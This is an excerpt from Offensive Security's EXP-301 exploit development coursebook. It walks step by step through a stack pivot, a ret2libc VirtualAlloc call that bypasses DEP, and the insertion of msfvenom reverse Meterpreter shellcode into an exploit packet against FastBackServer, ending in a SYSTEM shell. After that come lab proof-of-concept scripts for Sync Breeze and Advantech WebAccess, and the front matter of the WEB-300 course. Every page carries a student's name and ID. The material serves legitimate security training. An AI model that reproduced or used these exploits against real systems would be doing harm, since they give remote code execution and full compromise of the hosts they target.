OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
593 
Using RP++ to generate gadgets from kernelbase.dll, we do not find any clean “POP ESP” gadgets. 
One of the most suitable options is shown in Listing 769. 
0x100e1af4: pop esp ; add esi, dword [ebp+0x03] ; mov al, 0x01 ; ret 
Listing 769 - Stack pivot gadget 
The side effects of this gadget are minimal. EBP will be a stack pointer by default, so the 
dereference does not cause an access violation, and modifying AL is not a problem. 
Now that we know what we want to put into EIP and how to pivot the stack, we need to determine 
an address for the second psCommandBuffer that will work with the pivot gadget. 
We can figure this out easily by looking back at the previous execution of our exploit and 
comparing the location of the return address we overwrote with the value in ESP when the access 
violation is triggered. 
Listing 770 repeats the output from the previous execution of the exploit and reveals the stack 
address at which we overwrote the return address. 
kali@kali:~$ python3 poc.py 192.168.120.10 
The optimal start value is: 0x6080e 
... 
Kernelbase address leaked to event log 
About to overwrite return address at: 0x136fff4c 
Return address overwritten 
Listing 770 - Return address on the stack 
Likewise, Listing 771 repeats the contents of the registers when EIP is overwritten and the access 
violation is caused. 
(277c.1b6c): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=00000000 ebx=060eaf60 ecx=136fff70 edx=011208d0 esi=060eaf60 edi=00669360 
eip=41414141 esp=136fff54 ebp=136fff80 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
41414141 ??              ??? 
Listing 771 - Address in ESP when EIP is overwritten 
A comparison of the two addresses (0x136fff4c and 0x136fff54) shows a difference of eight 
between the return overwrite address and the location to which we must write the 
psCommandBuffer address. 
We now have all the information we need to update the exploit code and trigger the stack pivot. 
The changes are given in Listing 772. First, we’ll calculate the address of the second 
psCommandBuffer and the stack pivot gadget. We can then use the write primitive to place them 
both on the stack eight bytes apart. 
returnAddr = stackAddr + 0x62078 
bufAddr = stackAddr + 0x55c5c 
pivotAddr = kernelbaseBase + 0xe1af4 
 
print("About to overwrite return address at: " + str(hex(returnAddr))) 
writeDWORD(s, returnAddr, pivotAddr) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
594 
writeDWORD(s, returnAddr+8, bufAddr) 
print("Return address overwritten") 
 
s.close() 
Listing 772 - Updated Python code to trigger stack pivot 
It’s time to test our updated exploit. 
We’ll restart FastBackServer, attach WinDbg, and set a breakpoint on the stack pivot at 
kernelbase+0xe1af4. When the exploit is executed, the breakpoint is successfully triggered, as 
shown in Listing 773. 
0:077> bp kernelbase+0xe1af4 
 
0:078> g 
Breakpoint 0 hit 
eax=00000000 ebx=060cbdb8 ecx=0fbaff70 edx=012308d0 esi=060cbdb8 edi=00669360 
eip=745b1af4 esp=0fbaff54 ebp=0fbaff80 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
KERNELBASE!ConsoleIsConsoleSubsystem+0x16: 
745b1af4 5c              pop     esp 
 
0:089> dd esp L4 
0fbaff54  0fba3b30 00000001 060cbdb8 00000000 
Listing 773 - Breakpoint on pivot gadget is triggered 
At the end of Listing 773, we dump the first four DWORDs of the stack, enabling us to observe the 
stack pivot taking place as soon as the “POP ESP” instruction is executed. 
0:089> p 
eax=00000000 ebx=060cbdb8 ecx=0fbaff70 edx=012308d0 esi=060cbdb8 edi=00669360 
eip=745b1af5 esp=0fba3b30 ebp=0fbaff80 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
KERNELBASE!ConsoleIsConsoleSubsystem+0x17: 
745b1af5 037503          add     esi,dword ptr [ebp+3] ss:0023:0fbaff83=f195640f 
 
0:089> dd esp L4 
0fba3b30  44444444 45454545 46464646 47474747 
Listing 774 - ESP is changed to the psCommandBuffer 
Listing 774 shows that our work has paid off and we managed to pivot the stack to the 
psCommandBuffer. Excellent! 
The final part of this pivot ensures that the remainder of the stack pivot gadget executes and 
returns us into the first DWORD of the psCommandBuffer. 
0:089> p 
eax=00000000 ebx=060cbdb8 ecx=0fbaff70 edx=012308d0 esi=f7a221c7 edi=00669360 
eip=745b1af8 esp=0fba3b30 ebp=0fbaff80 iopl=0         nv up ei ng nz ac po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000292 
KERNELBASE!ConsoleIsConsoleSubsystem+0x1a: 
745b1af8 b001            mov     al,1 
 
0:089> p 
eax=00000001 ebx=060cbdb8 ecx=0fbaff70 edx=012308d0 esi=f7a221c7 edi=00669360 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
595 
eip=745b1afa esp=0fba3b30 ebp=0fbaff80 iopl=0         nv up ei ng nz ac po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000292 
KERNELBASE!ConsoleIsConsoleSubsystem+0x1c: 
745b1afa c3              ret 
 
0:089> p 
eax=00000001 ebx=060cbdb8 ecx=0fbaff70 edx=012308d0 esi=f7a221c7 edi=00669360 
eip=44444444 esp=0fba3b34 ebp=0fbaff80 iopl=0         nv up ei ng nz ac po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000292 
44444444 ??              ??? 
Listing 775 - Stack pivot gadget executes to the end 
EIP now contains the first DWORD from the psCommandBuffer and ESP points correctly, which 
will allow us to invoke a ROP chain. 
In this section, we leveraged our write primitive to precisely align both EIP and ESP, setting the 
stage for a ROP attack. 
12.3.2.1 Exercise 
1. 
Perform the modifications required in the exploit and step through the stack pivot. 
12.4 Getting Code Execution 
The analysis and development needed for this exploit has been intense, but we’re nearing the end. 
Two challenges remain: disabling DEP and executing shellcode. 
To bypass DEP, we will use VirtualAlloc (as in previous modules) to modify the memory 
protections of the memory pages inside the psCommandBuffer that contains our shellcode. 
12.4.1 
ROP Limitations 
When building our ROP chain, we first need to figure out which technique we’ll use to bypass DEP, 
and then examine what arguments we must supply to the API in question. 
In this case, we’ll use VirtualAlloc,396 the function prototype of which is given in Listing 776. 
LPVOID VirtualAlloc( 
  LPVOID lpAddress, 
  SIZE_T dwSize, 
  DWORD  flAllocationType, 
  DWORD  flProtect 
); 
Listing 776 - Function prototype for VirtualAlloc 
VirtualAlloc has four arguments. We will also need to supply the return address and the address 
of the function itself. 
In previous ROP attacks, we placed a ROP skeleton on the stack and dynamically updated the 
dummy values with correct values. This is often necessary due to three limitations: 
 
396 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
596 
1. 
The address of VirtualAlloc is not known beforehand due to ASLR. 
2. 
The stack address of the shellcode is not known beforehand. 
3. 
NULL bytes are bad characters and cannot be used. 
Let’s examine each of these limitations while considering our current situation. 
Our ASLR bypass that leaks the base address of kernelbase.dll allows us to bypass the first 
limitation by simply adding an offset to its base address to obtain the address of VirtualAlloc. The 
stack address is also leaked beforehand, which means the second limitation does not apply 
either. 
Since we will place the ROP chain in the psCommandBuffer and we have already found that NULL 
bytes are allowed in this buffer, we can hardcode the values for dwSize, flAllocationType, and 
flProtect. The shellcode address can also be part of the buffer, even if it contains NULL bytes. 
All of our hard work and pre-determined knowledge essentially transforms the ROP chain attack 
into an old-fashioned Ret2Libc attack, enabling us to directly call into VirtualAlloc after the stack 
pivot. 
We’ll need to set up the stack as illustrated in Listing 777 when the stack pivot finishes. 
VirtualAlloc address 
Return address == Shellcode address 
Shellcode address 
0x200 
0x1000 
0x40 
Listing 777 - VirtualAlloc arguments on the stack 
Since we use the psCommandBuffer of the last packet as our ROP and shellcode storage, we can 
directly place the VirtualAlloc related values into it, as shown in the code segment of Listing 778. 
print("Sending payload") 
# psAgentCommand 
buf = pack(">i", 0x400) 
buf += bytearray([0x41]*0xC) 
buf += pack("<i", 0x80)  # opcode 
buf += pack("<i", 0x0)    # 1st memcpy: offset 
buf += pack("<i", 0x100)  # 1st memcpy: size field 
buf += pack("<i", 0x100)  # 2nd memcpy: offset 
buf += pack("<i", 0x100)  # 2nd memcpy: size field 
buf += pack("<i", 0x200)  # 3rd memcpy: offset 
buf += pack("<i", 0x100)  # 3rd memcpy: size field 
buf += bytearray([0x41]*0x8) 
 
# psCommandBuffer 
buf += pack("<i", kernelbaseBase + 0x1125d0) 
buf += pack("<i", bufAddr + 0x18) 
buf += pack("<i", bufAddr + 0x18) 
buf += pack("<i", 0x200) 
buf += pack("<i", 0x1000) 
buf += pack("<i", 0x40) 
buf += b"C" * 0x200 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
597 
 
# Padding 
buf += bytearray([0x41]*(0x404-len(buf))) 
s.send(buf) 
Listing 778 - Implemented ret2lib packet 
The address of VirtualAlloc is found as an offset from the base address of kernelbase.dll, and the 
offset of 0x18 bytes from the psCommandBuffer aligns with the placeholder shellcode 
represented with C’s. 
Now, let’s restart FastBackServer, set a breakpoint on the stack pivot, and execute the updated 
Python code. 
0:067> bp kernelbase+0xe1af4 
 
0:067> g 
Breakpoint 0 hit 
eax=00000000 ebx=0610c280 ecx=0f61ff70 edx=00da08d0 esi=0610c280 edi=00669360 
eip=745b1af4 esp=0f61ff54 ebp=0f61ff80 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
KERNELBASE!ConsoleIsConsoleSubsystem+0x16: 
745b1af4 5c              pop     esp 
 
0:088> p 
... 
0:088> p 
eax=00000001 ebx=0610c280 ecx=0f61ff70 edx=00da08d0 esi=f7a6268f edi=00669360 
eip=745e25d0 esp=0f613b34 ebp=0f61ff80 iopl=0         nv up ei ng nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000282 
KERNELBASE!VirtualAlloc: 
745e25d0 8bff            mov     edi,edi 
 
0:088> dds esp L5 
0f613b34  0f613b48 
0f613b38  0f613b48 
0f613b3c  00000200 
0f613b40  00001000 
0f613b44  00000040 
Listing 779 - Pivoting into VirtualAlloc 
Once the stack pivot finishes, we’ll land directly into VirtualAlloc and, as highlighted in Listing 779, 
the return address and required arguments are set. 
We can now verify that the return address contains our placeholder shellcode and check the 
memory protections of the shellcode location before VirtualAlloc is executed. 
0:088> u 0f613b48 L4 
0f613b48 43              inc     ebx 
0f613b49 43              inc     ebx 
0f613b4a 43              inc     ebx 
0f613b4b 43              inc     ebx 
 
0:088> !vprot 0f613b48 
BaseAddress:       0f613000 
AllocationBase:    0f520000 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
598 
AllocationProtect: 00000004  PAGE_READWRITE 
RegionSize:        0000d000 
State:             00001000  MEM_COMMIT 
Protect:           00000004  PAGE_READWRITE 
Type:              00020000  MEM_PRIVATE 
Listing 780 - Memory protections before VirtualAlloc 
The return address is correctly aligned, and the current memory protection is set to read- and 
write-only. 
We can now let execution continue until VirtualAlloc completes. 
0:088> pt 
eax=0f613000 ebx=0610c280 ecx=0f613b04 edx=77251670 esi=f7a6268f edi=00669360 
eip=745e2623 esp=0f613b34 ebp=0f61ff80 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
KERNELBASE!VirtualAlloc+0x53: 
745e2623 c21000          ret     10h 
 
0:088> !vprot 0f613b48 
BaseAddress:       0f613000 
AllocationBase:    0f520000 
AllocationProtect: 00000004  PAGE_READWRITE 
RegionSize:        00001000 
State:             00001000  MEM_COMMIT 
Protect:           00000040  PAGE_EXECUTE_READWRITE 
Type:              00020000  MEM_PRIVATE 
Listing 781 - Memory protections after VirtualAlloc 
As highlighted in Listing 781, the return value from VirtualAlloc is non-zero, and the memory 
protections have been updated to readable, writable, and executable. Nice! 
The final proof of our success is shown in Listing 782, as we execute the placeholder shellcode 
on the stack. 
0:088> p 
eax=0f613000 ebx=0610c280 ecx=0f613b04 edx=77251670 esi=f7a6268f edi=00669360 
eip=0f613b48 esp=0f613b48 ebp=0f61ff80 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0f613b48 43              inc     ebx 
 
0:088> p 
eax=0f613000 ebx=0610c281 ecx=0f613b04 edx=77251670 esi=f7a6268f edi=00669360 
eip=0f613b49 esp=0f613b48 ebp=0f61ff80 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
0f613b49 43              inc     ebx 
 
0:088> p 
eax=0f613000 ebx=0610c282 ecx=0f613b04 edx=77251670 esi=f7a6268f edi=00669360 
eip=0f613b4a esp=0f613b48 ebp=0f61ff80 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
0f613b4a 43              inc     ebx 
Listing 782 - Executing placeholder shellcode 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
599 
We were able to use our read and write primitives to bypass both ASLR and DEP, then obtain 
arbitrary code execution. What’s left for us? To get a reverse shell. 
12.4.1.1 Exercises 
1. 
Build the ret2libc-style buffer in the Python code. 
2. 
Execute the exploit and bypass DEP to obtain arbitrary code execution. 
12.4.2 
Getting a Shell 
After intensive effort, we have reached the final step of our exploit development. Now that we’ve 
obtained arbitrary code execution after bypassing DEP and ASLR, it’s time to insert a real 
shellcode and get a reverse shell back. 
Let’s start by generating the first stage shellcode. We can use msfvenom to generate a staged 
reverse Meterpreter payload with no bad characters defined, as shown in Listing 783. 
kali@kali:~$ msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 
LPORT=443 EXITFUNC=thread -f python -v shell 
... 
Payload size: 678 bytes 
Final size of python file: 3306 bytes 
shell =  b"" 
shell += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b" 
shell += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7" 
... 
shell += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53" 
shell += b"\xff\xd5" 
Listing 783 - Payload generation with msfvenom 
From our analysis in this module, we know that each connection to FastBackServer creates a new 
thread. We’ll specify thread for the EXITFUNC option to ensure that the application does not 
crash when we exit our shell. 
We previously found the shellcode size to be 678 bytes, which is more than the default 0x100 
bytes allotted to the first psCommandBuffer. 
In Listing 784, we have increased this size to 0x300 and appended the shellcode through the shell 
variable after the VirtualAlloc ret2lib information. 
print("Sending payload") 
# psAgentCommand 
buf = pack(">i", 0x400) 
buf += bytearray([0x41]*0xC) 
buf += pack("<i", 0x80)  # opcode 
buf += pack("<i", 0x0)    # 1st memcpy: offset 
buf += pack("<i", 0x300)  # 1st memcpy: size field 
buf += pack("<i", 0x100)  # 2nd memcpy: offset 
buf += pack("<i", 0x100)  # 2nd memcpy: size field 
buf += pack("<i", 0x200)  # 3rd memcpy: offset 
buf += pack("<i", 0x100)  # 3rd memcpy: size field 
buf += bytearray([0x41]*0x8) 
 
# psCommandBuffer 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
600 
buf += pack("<i", kernelbaseBase + 0x1125d0) 
buf += pack("<i", bufAddr + 0x18) 
buf += pack("<i", bufAddr + 0x18) 
buf += pack("<i", 0x200) 
buf += pack("<i", 0x1000) 
buf += pack("<i", 0x40) 
buf += shell 
 
# Padding 
buf += bytearray([0x41]*(0x404-len(buf))) 
s.send(buf) 
 
s.close() 
print("Shell is incoming!") 
Listing 784 - Shellcode is included in the payload packet 
Once the final exploit is executed, we’ll successfully obtain a reverse Meterpreter shell, as 
displayed in Listing 785. 
msf5 exploit(multi/handler) > exploit 
 
[*] Started HTTP reverse handler on http://192.168.119.120:443 
[*] http://192.168.119.120:443 handling request from 192.168.120.10; (UUID: 5sme6pol) 
Staging x86 payload (181337 bytes) ... 
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.10:53063) 
 
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM 
Listing 785 - Obtaining a reverse Meterpreter shell from FastBackServer 
We’ve obtained a reverse shell by using the read and write primitive, only overwriting two 
DWORDs on the stack. Very nice! 
12.4.2.1 Exercises 
1. 
Generate a reverse Meterpreter shellcode and insert it into the exploit. 
2. 
Update the size field for the first psCommandBuffer and replace the placeholder shellcode 
with the Meterpreter shellcode in the payload packet. 
3. 
Obtain a reverse Meterpreter shell from FastBackServer. 
12.5 Wrapping Up 
This module introduced us to the concept of a write primitive. We then created one through the 
format string vulnerability and combined it with the read primitive to obtain code execution. 
The length and complexity of the attack path shown in both this and the previous module 
indicates the kind of persistent and creative thinking processes required for advanced exploits 
targeted against complex applications, such as web browsers. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
601 
 
13 Trying Harder: The Labs 
Following the successful completion of the course material, you can access several challenges in 
the control panel. 
When selecting a challenge from the control panel, a VM is started that will contain one or more 
vulnerable applications. For these applications, you must discover the security mitigations in 
place, reverse engineer one or more vulnerabilities, and develop an exploit. 
Take the time to work on these challenges and develop a methodology for enumeration, reverse 
engineering, and exploit development. 
The following sections contain information that will aid you in targeting the intended services 
along with some tips. 
13.1 Challenge 1 
Challenge 1 makes use of the Intelligent Management Center (iMC) application portfolio by HP 
Enterprise. It contains a multitude of applications listening on more than 15 different network 
ports, offering a wide attack surface. 
Several hundred vulnerabilities have been found in the application over the last 5 years. In this 
challenge, the TFTP server that comes packaged with iMC is the target. 
The TFTP server presents a good challenge for reverse engineering and exploit development, as 
the vulnerability is a stack buffer overflow that requires some interesting conditions. 
In this challenge, you should reverse engineer the application, locate the vulnerability, and develop 
an exploit for it. As a hint, keep in mind that the UDP protocol is stateless, which means many 
applications that receive data over UDP use the recvfrom API instead of recv. 
The TFTP server is automatically restarted when it is closed or crashes, which makes restarting 
the debugging session easy. 
13.2 Challenge 2 
In Challenge 2, we return to Sync Breeze version 10.0.28. We already know this application 
contains a basic stack buffer overflow that will provide us with control over EIP. 
Previously in this course, we exploited Sync Breeze on Windows 10, which has a default DEP 
policy of OptIn. In this challenge, the application is installed on Windows Server 2019, which has 
DEP set to AlwaysOn by default. 
The basic proof of concept to overflow the stack buffer and obtain control of EIP is shown below. 
#!/usr/bin/python 
import socket 
import sys 
 
try: 
  server = sys.argv[1] 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
602 
  port = 80 
  size = 800 
  inputBuffer = b"A" * size 
  content = b"username=" + inputBuffer + b"&password=A" 
 
  buffer = b"POST /login HTTP/1.1\r\n" 
  buffer += b"Host: " + server.encode() + b"\r\n" 
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 
Firefox/52.0\r\n" 
  buffer += b"Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" 
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n" 
  buffer += b"Referer: http://10.11.0.22/login\r\n" 
  buffer += b"Connection: close\r\n" 
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n" 
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n" 
  buffer += b"\r\n" 
  buffer += content 
 
  print("Sending evil buffer...") 
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
  s.connect((server, port)) 
  s.send(buffer) 
  s.close() 
   
  print("Done!") 
   
except socket.error: 
  print("Could not connect!") 
Listing 786 - Proof of concept for Sync Breeze 
You should use the same vulnerability to create an exploit in this challenge, in this case leveraging 
ROP to bypass DEP and obtain a reverse shell. 
13.3 Challenge 3 
This challenge uses the Adventech WebAccess SCADA application suite, which contains the large, 
vulnerable application webvrpcs.exe. 
We recommend targeting the attack surface on TCP port 4592. It is possible to reverse engineer 
the network protocol, but this is quite complex because it uses Microsoft RPC. 
If you choose to reverse engineer the network protocol, the TCP data packets are accepted by the 
application through the Windows WSArecv API from WS2_32.DLL. The data is processed by the 
native RPC interface implemented in RPCRT4.DLL. As this is native Windows code, vulnerabilities 
related to webvrpcs.exe will not be found in this part of the protocol parsing. 
Once the native RPC processing is complete, the custom application-specific handler code is 
located inside webvrpcs.exe at the address webvrpcs+0x4590. 
Because the network traffic is parsed by Microsoft RPC, it is possible to use Impacket to create 
RPC requests from Linux. A basic proof of concept is shown in Listing 787. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
603 
import sys, struct 
from impacket import uuid 
from impacket.dcerpc.v5 import transport 
 
def call(dce, opcode, stubdata): 
  dce.call(opcode, stubdata) 
  res = -1 
  try: 
    res = dce.recv() 
  except Exception as e: 
    print("Exception encountered..." + str(e)) 
    sys.exit(1) 
  return res 
 
if len(sys.argv) != 2: 
  print("Provide only host arg") 
  sys.exit(1) 
 
port = 4592 
interface = "5d2b62aa-ee0a-4a95-91ae-b064fdb471fc" 
version = "1.0"  
 
host = sys.argv[1] 
 
string_binding = "ncacn_ip_tcp:%s" % host 
trans = transport.DCERPCTransportFactory(string_binding) 
trans.set_dport(port) 
 
print("Connecting to the target") 
 
dce = trans.get_dce_rpc() 
dce.connect() 
 
iid = uuid.uuidtup_to_bin((interface, version)) 
dce.bind(iid) 
 
print("Getting a handle to the RPC server") 
stubdata = struct.pack("<I", 0x02) 
res = call(dce, 4, stubdata) 
if res == -1: 
  print("Something went wrong") 
  sys.exit(1) 
res = struct.unpack("III", res) 
 
if (len(res) < 3): 
  print("Received unexpected length value") 
  sys.exit(1) 
 
print("Sending payload") 
 
opcode = 11111 
 
stubdata = struct.pack("<IIII", res[2], opcode, 0x111, 0x222) 
buf = bytearray([0x41]*0x1000) 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
604 
stubdata += buf 
res = call(dce, 1, stubdata) 
print(res) 
 
print("Done, disconnecting") 
 
dce.disconnect() 
Listing 787 - Proof of concept using Impacket 
With this code, we can trigger the opcode-parsing code inside webvrpcs.exe and perform reverse 
engineering to locate valid code branches and vulnerabilities. 
While the application has not been compiled with ASLR, it has been enabled with Windows 
Defender Exploit Guard (WDEG). To successfully exploit the application, you must locate 
vulnerabilities that enable remote ASLR bypass along with memory corruption. Then, you’ll need 
to chain the vulnerabilities together in your exploit to bypass both ASLR and DEP. 
It’s worth noting that this application contains a huge number of different vulnerabilities ranging 
from command injection to stack and heap buffer overflows. For this challenge, focus on memory 
corruption vulnerabilities that corrupt the stack to get control of EIP. 
As a final note, you will observe that webvrpcs.exe is not associated with a service, but is 
restarted by a monitoring application called webvkeep.exe. This application keeps a heartbeat on 
webvrpcs.exe and, when a debugger has paused it for an extended amount of time, it will be 
restarted. To avoid issues while debugging, it is possible to suspend webvkeep.exe with tools like 
Process Explorer. 
13.4 Wrapping Up 
If you’ve taken the time to understand the course material presented in the coursebook and 
associated videos, and have tackled all the exercises, you’ll enjoy these challenges. 
If you’re having trouble, step back and take on a new perspective. It’s easy to get fixated on a 
single problem and lose sight of the fact that there may be a simpler solution waiting down a 
different path. 
Take good notes and review them often. Searching for alternate paths might reveal the way 
forward. Finally, when all else fails, do not hesitate to reach out to the Student Administrators. 
For information related to the OSED certification exam, please refer back to the introductory 
module or review our exam guide.397 
Finally, remember that you often have all the knowledge you need to tackle the problem in front of 
you. Don’t give up, and remember to Try Harder! 
 
397 (Offensive Security, 2021), https://help.offensive-security.com/hc/en-us/articles/360052977212-OSED-Exam-Guide 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
1 
Advanced Web Attacks and  
Exploitation 
Offensive Security 
 
 
                   
 
555704
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
2 
Copyright © 2021 Offensive Security Ltd.   
 
All rights reserved. No part of this publication, in whole or in part, may be reproduced, 
copied, transferred or any other right reserved to its copyright owner, including 
photocopying and all other copying, any transfer or transmission using any network or 
other means of communication, any broadcast for distant learning, in any form or by any 
means such as any information storage, transmission or retrieval system, without prior 
written permission from the author. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
3 
Table of Contents 
1. 
Introduction ............................................................................................................................................. 10 
1.1 
About the AWAE Course ............................................................................................................. 10 
1.1.2 
OSWE Exam Attempt .......................................................................................................... 12 
1.2 
Our Approach ................................................................................................................................ 12 
1.3 
Obtaining Support ......................................................................................................................... 13 
1.4 
Offensive Security AWAE Labs .................................................................................................. 14 
1.4.1 
General Information ............................................................................................................ 14 
1.4.2 
Lab Restrictions ................................................................................................................... 14 
1.4.3 
Forewarning and Lab Behavior ......................................................................................... 14 
1.4.4 
Control Panel ........................................................................................................................ 14 
1.5 
Reporting ........................................................................................................................................ 15 
1.6 
Backups .......................................................................................................................................... 15 
1.7 
About the OSWE Exam ................................................................................................................ 15 
1.8 
Wrapping Up .................................................................................................................................. 16 
2. 
Tools & Methodologies ......................................................................................................................... 17 
2.1 
Web Traffic Inspection ................................................................................................................ 17 
2.1.1 
Burp Suite Proxy .................................................................................................................. 18 
2.1.2 
Using Burp Suite with Other Browsers ............................................................................ 23 
2.1.3 
Burp Suite Scope ................................................................................................................. 24 
2.1.4 
Burp Suite Repeater and Comparer ................................................................................. 27 
2.1.5 
Burp Suite Decoder ............................................................................................................. 32 
2.2 
Interacting with Web Listeners using Python ......................................................................... 34 
2.3 
Source Code Recovery ................................................................................................................ 38 
2.3.1 
Managed .NET Code ........................................................................................................... 38 
2.3.2 
Decompiling Java Classes ................................................................................................ 46 
2.4 
Source Code Analysis Methodology ......................................................................................... 50 
2.4.1 
An Approach to Analysis .................................................................................................... 51 
2.4.2 
Using an IDE ......................................................................................................................... 52 
2.4.3 
Common HTTP Routing Patterns .................................................................................... 55 
2.4.4 
Analyzing Source Code for Vulnerabilities ...................................................................... 56 
2.5 
Debugging ...................................................................................................................................... 57 
2.5.1 
Remote Debugging ............................................................................................................. 61 
2.6 
Wrapping Up .................................................................................................................................. 69 
3. 
ATutor Authentication Bypass and RCE ............................................................................................ 70 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
4 
3.1 
Getting Started .............................................................................................................................. 70 
3.1.1 
Setting Up the Environment .............................................................................................. 70 
3.2 
Initial Vulnerability Discovery ...................................................................................................... 72 
3.3 
A Brief Review of Blind SQL Injections ..................................................................................... 81 
3.4 
Digging Deeper .............................................................................................................................. 82 
3.4.1 
When $addslashes Are Not ............................................................................................... 83 
3.4.2 
Improper Use of Parameterization .................................................................................. 84 
3.5 
Data Exfiltration ............................................................................................................................ 86 
3.5.1 
Comparing HTML Responses ........................................................................................... 87 
3.5.2 
MySQL Version Extraction ................................................................................................. 89 
3.6 
Subverting the ATutor Authentication ...................................................................................... 93 
3.7 
Authentication Gone Bad ............................................................................................................ 98 
3.8 
Bypassing File Upload Restrictions ......................................................................................... 100 
3.9 
Gaining Remote Code Execution ............................................................................................. 109 
3.9.1 
Escaping the Jail ............................................................................................................... 109 
3.9.2 
Disclosing the Web Root .................................................................................................. 110 
3.9.3 
Finding Writable Directories ............................................................................................ 111 
3.9.4 
Bypassing File Extension Filter ....................................................................................... 112 
3.10 
Wrapping Up ................................................................................................................................ 114 
4. 
ATutor LMS Type Juggling Vulnerability .......................................................................................... 116 
4.1 
Getting Started ............................................................................................................................ 116 
4.2 
PHP Loose and Strict Comparisons ....................................................................................... 116 
4.3 
PHP String Conversion to Numbers ....................................................................................... 118 
4.4 
Vulnerability Discovery .............................................................................................................. 120 
4.5 
Attacking the Loose Comparison ............................................................................................ 123 
4.5.1 
Magic Hashes .................................................................................................................... 123 
4.5.2 
ATutor and the Magic E-Mail address ........................................................................... 124 
4.6 
Wrapping Up ................................................................................................................................ 130 
5. 
ManageEngine Applications Manager AMUserResourcesSyncServlet SQL Injection RCE ... 131 
5.1 
Getting Started ............................................................................................................................ 131 
5.2 
Vulnerability Discovery .............................................................................................................. 131 
5.2.2 
Servlet Mappings ............................................................................................................... 132 
5.2.3 
Source Code Recovery ..................................................................................................... 133 
5.2.4 
Analyzing the Source Code .............................................................................................. 134 
5.2.5 
Enabling Database Logging ............................................................................................. 139 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
5 
